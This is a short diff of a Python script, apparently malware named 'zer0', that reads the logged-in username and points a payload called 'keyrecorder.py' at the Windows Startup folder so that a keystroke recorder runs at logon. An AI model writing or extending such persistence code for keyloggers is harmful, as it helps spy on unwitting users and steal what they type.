@@ -7,12 +7,9 @@ from requests import get
 # Other python functions in same dir
 from art import printAscii
 
-
 # Getting the username of logged in account
 user = os.getlogin()
 
-# Starts command prompt 
-os.system("start cmd")
 # Run zer0
 startup_path = r"C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 payload = "keyrecorder.py"
